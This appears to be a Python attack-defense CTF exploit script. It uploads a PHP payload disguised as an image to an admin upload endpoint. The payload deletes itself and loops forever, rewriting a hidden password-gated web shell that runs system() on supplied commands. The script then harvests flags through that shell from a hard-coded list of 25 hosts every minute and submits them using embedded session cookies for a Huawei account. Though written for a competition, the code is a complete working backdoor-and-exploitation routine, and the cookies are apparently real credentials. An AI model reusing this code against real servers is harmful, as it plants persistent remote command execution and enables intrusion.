#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
exploit 为单个攻击测试
main 为单进程同时攻击
'''
import time
import requests

def uploadshell(host, port):
    # import requests
    request = requests.Session()
    burp0_url = "http://%s:%s/admin/?r=imageset" % (host, port)
    burp0_cookies = {"user": "admin", "PHPSESSID": "ml86ou8b18b2u4osuvuiplk581"}
    burp0_headers = {"Proxy-Connection": "keep-alive", "Cache-Control": "max-age=0", "Origin": "http://localhost",
                     "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                     "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypaVKMSgzREFtcXCJ",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     "Referer": "http://localhost/admin/?r=imageset", "Accept-Encoding": "gzip, deflate, br",
                     "Accept-Language": "zh-CN,zh;q=0.8"}
    burp0_data = "------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"images\"; filename=\"Readme.php5\"\r\nContent-Type: images/jpeg\r\n\r\n<?php \r\n\r\nignore_user_abort(true);\r\nset_time_limit(0);\r\nunlink(__FILE__);\r\n$file = '/var/www/html/.hackbywzh.php';\r\n$code = '<?php if(md5($_GET[\"pass\"])==\"b53f3cb1d946e28824084f53130d9f87\"){@system($_POST[a]);} ?>';\r\nwhile (1){\r\n    file_put_contents($file,$code);\r\n    usleep(5000);\r\n}\r\n?>\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"img_weizhi\"\r\n\r\n3\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"img_moshi\"\r\n\r\n2\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"img_wzkd\"\r\n\r\n305\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"img_wzgd\"\r\n\r\n202\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ\r\nContent-Disposition: form-data; name=\"save\"\r\n\r\n1\r\n------WebKitFormBoundarypaVKMSgzREFtcXCJ--\r\n"

    r = request.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).content
    # print(r)

    burp0_headers = {"Proxy-Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     "Referer": "http://localhost/admin/?r=manageinfo", "Accept-Encoding": "gzip, deflate, sdch, br",
                     "Accept-Language": "zh-CN,zh;q=0.8"}
    content = request.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).content
    # print(r)
    content = str(content)
    content = content.split('''upload/watermark/''')[1].split('" >')[0]
    flag = content.replace("\n", "")
    print flag
    url = "http://%s:%s/upload/watermark/%s" % (host, port, flag)
    r = request.get(url, headers=burp0_headers, cookies=burp0_cookies, ).content
    print r.status_code


def get_flag(host, port):
    url = "http://%s:%s/.hackbywzh.php?pass=hackicslhackicsl&a=getflag" % (host, port)
    # url = "http://127.0.0.1/1.txt"
    headers = {}
    response = requests.get(url, headers=headers)
    content = str(response.content)
    try:
        content = content.split(':')[2]
        flag = content.replace("\n", "").replace("'", "")
        print flag
        return flag
    except:
        print "Fixed!"  # 被修复
        return ""




# if __name__ == '__main__':
#     ips = ["172.17.1.70", "172.17.4.207", "172.17.3.74", "172.17.3.236", "172.17.4.98", "172.17.3.124", "172.17.3.34",
#            "172.17.2.134", "172.17.2.145", "172.17.2.221", "172.17.1.237", "172.17.2.66", "172.17.4.176",
#            "172.17.1.146", "172.17.3.211", "172.17.4.177", "172.17.3.103", "172.17.1.32", "172.17.1.211", "172.17.1.17",
#            "172.17.1.230", "172.17.1.239", "172.17.3.93", "172.17.1.57", "172.17.3.248"]
#     try:
#         for ip in ips:
#             print ip
#             uploadshell(ip, 80)
#     except:
#         pass

token = ""
def submit_flag(flag, token):
    burp0_url = "http://month.ctf.huawei.com:80/sendconflictflag"
    burp0_cookies = {"_dmpa_id": "76367b2f1d8fe8b7d4d4c300751671490871593870.1490871594.22.1537176057.1536407795.",
                     "_dmpa_ref": "%5B%22%22%2C%22%22%2C1537010965%2C%22http%3A%2F%2Fwww.honor.cn%2F%22%5D",
                     "v1st": "15B1EE2C0AD355FF",
                     "FORUM_LOGIN_AUTH_SECURE_CODE": "77-43-D3-93-27-3F-2E-44-76-F7-5E-A6-81-20-9E-CD-9F-83-79-3C-BF-1F-59-D4-E6-33-0E-6A-3D-67-33-92-40-FF-7B-F8-07-F7-24-0B-00-88-F4-AA-7D-8E-6C-D1-BD-B0-89-4D-C4-54-80-37",
                     "__hau": "HuaweiConnect.1515720684.50520363",
                     "AMCV_7DA25C0158C1322D0A495DB1%40AdobeOrg": "1099438348%7CMCIDTS%7C17569%7CMCMID%7C45641806404925707266212307174569030497%7CMCAID%7CNONE%7CMCOPTOUT-1517917697s%7CNONE%7CvVersion%7C2.1.0",
                     "support_last_vist": "carrier", "HW3MS_think_language": "zh-cn", "authmethod": "authpwd",
                     "hwssot3": "26275226252217", "hwsso_login": "\"\"",
                     "_dmpa_ses": "f2caad30c2e98637cd16e442f83241e0a9ff89dc",
                     "HWFORUM_SESSION": "0f3f5d5d24336b92b6c81e752f4b62e760e8d7a11a7f395d00932445d90c3d2a0901608421bbf58382f5dc89c7e129a4ae44c365752abe426086200d5d1c8e98f462a18c8404e2f3697388af71454172",
                     "MacaronSession": "0025d0221b7fc983"}
    burp0_headers = {"POST http": "/month.ctf.huawei.com/sendconflictflag HTTP/1.1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Referer": "http://month.ctf.huawei.com/conflict",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-Requested-With": "XMLHttpRequest", "DNT": "1", "Connection": "close"}
    burp0_data = {"flag": flag}
    print "[+] Submiting flag : [%s]" % (burp0_data)
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).content
    content = str(r)
    print "[+] Content : %s" % (content)


def exploit(host, port):
    print "[+] Exploiting : [%s:%s]" % (host, port)
    '''
    usage example:
    1. import pwn_exp 
    2. reload pwn_exp
    3. pwn_exp.get_flag(host, port) replace get_flag(host, port)
    '''
    flag = get_flag(host, port)
    submit_flag(flag, token)


def exploit_all():
    port = 80
    hosts = ["172.17.1.70", "172.17.4.207", "172.17.3.74", "172.17.3.236", "172.17.4.98", "172.17.3.124", "172.17.3.34",
             "172.17.2.134", "172.17.2.145", "172.17.2.221", "172.17.1.237", "172.17.2.66", "172.17.4.176",
             "172.17.1.146", "172.17.3.211", "172.17.4.177", "172.17.3.103", "172.17.1.32", "172.17.1.211",
             "172.17.1.17", "172.17.1.230", "172.17.1.239", "172.17.3.93", "172.17.1.57", "172.17.3.248"]

    for host in hosts:
        exploit(host, port)


def main():
    while True:
        exploit_all()
        time.sleep(60)


if __name__ == "__main__":
    main()
